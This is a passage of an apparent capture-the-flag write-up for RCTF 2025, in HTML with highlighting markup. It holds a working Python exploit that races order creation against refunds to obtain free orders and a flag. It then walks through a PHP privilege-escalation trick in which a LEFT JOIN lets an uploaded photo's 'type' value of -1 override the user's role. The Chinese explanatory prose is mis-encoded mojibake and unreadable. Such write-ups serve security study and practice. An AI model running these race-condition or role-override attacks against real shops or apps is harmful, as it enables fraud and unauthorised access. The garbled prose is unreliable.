function">create_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_id<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    body <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"productId"</span><span class="token punctuation">:</span> product_id<span class="token punctuation">,</span>        <span class="token string">"quantity"</span><span class="token punctuation">:</span> quantity<span class="token punctuation">,</span>        <span class="token string">"couponId"</span><span class="token punctuation">:</span> coupon_id<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/create"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">refund_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> order_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"/api/order/refund/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>order_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ensure_coupon_unused</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">for</span> o <span class="token keyword">in</span> orders<span class="token punctuation">:</span>        <span class="token keyword">if</span> o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"couponId"</span><span class="token punctuation">)</span> <span class="token operator">==</span> coupon_id <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] Restoring coupon by refunding order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> o<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">zero_cost_purchase</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> target_name<span class="token punctuation">,</span> max_tries<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    target_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>target_name<span class="token punctuation">]</span>    base_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>BASE_PRODUCT_NAME<span class="token punctuation">]</span>    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_tries <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string"> try #</span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        ensure_coupon_unused<span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>        base_resp <span class="token operator">=</span> create_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span>coupon_id<span class="token punctuation">)</span>        <span class="token keyword">if</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span> <span class="token keyword">or</span> <span class="token keyword">not</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] base order failed:"</span><span class="token punctuation">,</span> base_resp<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        base_order_id <span class="token operator">=</span> base_resp<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>        create_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        refund_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">def</span> <span class="token function">t_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">nonlocal</span> create_result            create_result <span class="token operator">=</span> create_order<span class="token punctuation">(</span>                token<span class="token punctuation">,</span> target_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span>            <span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">t_refund</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">nonlocal</span> refund_result            refund_result <span class="token operator">=</span> refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_order_id<span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_create<span class="token punctuation">)</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_refund<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        target_order_id <span class="token operator">=</span> <span class="token boolean">None</span>        success_create <span class="token operator">=</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            <span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success_create<span class="token punctuation">:</span>            target_order_id <span class="token operator">=</span> create_result<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>        orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        has_target_completed <span class="token operator">=</span> <span class="token builtin">any</span><span class="token punctuation">(</span>            o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token operator">==</span> target_pid <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> orders        <span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance<span class="token punctuation">&#125;</span></span><span class="token string">, target_completed=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_target_completed<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> has_target_completed<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [+] Got free COMPLETED order for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> target_order_id<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] refund target order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_order_id<span class="token punctuation">&#125;</span></span><span class="token string"> to restore balance"</span></span><span class="token punctuation">)</span>            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> target_order_id<span class="token punctuation">)</span>            balance_after <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance after refund=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance_after<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> balance_after <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low after refund, give up this user"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> balance <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low, give up this user"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [-] Max tries reached for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">, give up on this user."</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">conditions_satisfied</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    completed <span class="token operator">=</span> <span class="token punctuation">[</span>o <span class="token keyword">for</span> o <span class="token keyword">in</span> orders <span class="token keyword">if</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">]</span>    completed_pids <span class="token operator">=</span> <span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> completed<span class="token punctuation">&#125;</span>    has_all_products <span class="token operator">=</span> <span class="token builtin">all</span><span class="token punctuation">(</span>pid <span class="token keyword">in</span> completed_pids <span class="token keyword">for</span> pid <span class="token keyword">in</span> product_ids<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    has_balance_10 <span class="token operator">=</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span>    has_unused_coupon <span class="token operator">=</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> has_all_products<span class="token punctuation">,</span> has_balance_10<span class="token punctuation">,</span> has_unused_coupon<span class="token punctuation">,</span> orders<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/flag/get"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] /api/flag/get:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">exploit_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_id<span class="token punctuation">,</span> token <span class="token operator">=</span> register_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    products <span class="token operator">=</span> get_products<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>        <span class="token keyword">assert</span> name <span class="token keyword">in</span> products<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"product </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span>    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>    coupon_id <span class="token operator">=</span> coupon<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"[+] User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_id=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>coupon_id<span class="token punctuation">&#125;</span></span><span class="token string">, balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token punctuation">)</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>        ok <span class="token operator">=</span> zero_cost_purchase<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ok<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    has_all<span class="token punctuation">,</span> has_bal10<span class="token punctuation">,</span> has_unused<span class="token punctuation">,</span> _ <span class="token operator">=</span> conditions_satisfied<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"[+] Final check: products=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_all<span class="token punctuation">&#125;</span></span><span class="token string">, balance10=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_bal10<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_unused=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_unused<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token punctuation">)</span>    <span class="token keyword">if</span> has_all <span class="token keyword">and</span> has_bal10 <span class="token keyword">and</span> has_unused<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Conditions satisfied, requesting flag..."</span><span class="token punctuation">)</span>        get_flag<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"===== Attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string"> ====="</span></span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> exploit_once<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] Error in attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°é…ç½®é«˜äº†åè€Œå¤ç°ä¸äº†ï¼ˆï¼‰</p><hr><h1 id="photographer"><a href="#photographer" class="headerlink" title="photographer"></a>photographer</h1><p>ç›´æ¥çœ‹è·å– flag çš„ä»£ç  superadmin.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../app/config/autoload.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user_types</span> <span class="token operator">=</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user_types'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$user_types</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'RCTF&#123;test_flag&#125;'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªéœ€è¦ä½¿ç™»å½•ç”¨æˆ·çš„ type å°äº admin å³å¯ï¼Œè€Œ</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">'user_types' => <span class="token punctuation">[</span>    'admin' => <span class="token number">0</span><span class="token punctuation">,</span>    'auditor' => <span class="token number">1</span><span class="token punctuation">,</span>    'user' => <span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ type å¾—å°äº 0</p><p>è€ƒè™‘ä»æ•°æ®åº“å…¥æ‰‹ï¼Œåœ¨ DB.php æŸ¥æ‰¾å¼•ç”¨ï¼Œæ³¨æ„åˆ° <code>leftJoin</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">findById</span><span class="token punctuation">(</span><span class="token variable">$userId</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token class-name static-context">DB</span><span class="token operator">::</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">leftJoin</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user.background_photo_id'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'photo.id'</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user.id'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token variable">$userId</span><span class="token punctuation">)</span>        <span class="token operator">-></span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ ¹æ®ç”¨æˆ· ID æŸ¥æ‰¾å¹¶è¿”å›è¯¥ç”¨æˆ·çš„ä¸€æ¡è®°å½•ï¼ŒåŒæ—¶å°è¯•æŠŠç”¨æˆ·çš„èƒŒæ™¯ç…§ç‰‡ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ï¼‰ä¸€èµ·é€šè¿‡Â <code>LEFT JOIN</code>Â æ‹‰å‡ºæ¥ï¼Œæ­¤å¤„æ˜¯ photo ä¸ºä¸»è¡¨ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¯¹äºå·¦è¡¨ï¼ˆä¸»è¡¨ï¼‰ï¼Œ<code>LEFT JOIN</code>Â ä¼šä¿ç•™è¯¥è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œå¦‚æœ photo æœ‰å’Œ user åŒæ ·çš„åˆ—åï¼Œé‚£ä¹ˆå°±ä¼šä»¥ photo ä¸ºå‡†</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117005902470.png"></p><p>è§‚å¯Ÿå‘ç°ä¸¤ä¸ªè¡¨å‡å…·æœ‰ type å­—æ®µï¼Œå¯ä»¥å°è¯•æ„é€  photo çš„ type ä¸º -1ï¼Œè€Œ <code>findById</code> è¿”å›çš„ type å³ä¸º -1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Auth</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">PHP_SESSION_NONE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token class-name static-context">User</span><span class="token operator">::</span><span class="token function">findById</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œ findById è¢«ç”¨äº Auth åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæ€è·¯å°±å®Œæ•´äº†</p><p>å…³äº photo çš„ type æ„é€ åœ¨ PhotoController::upload ä¸­ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token 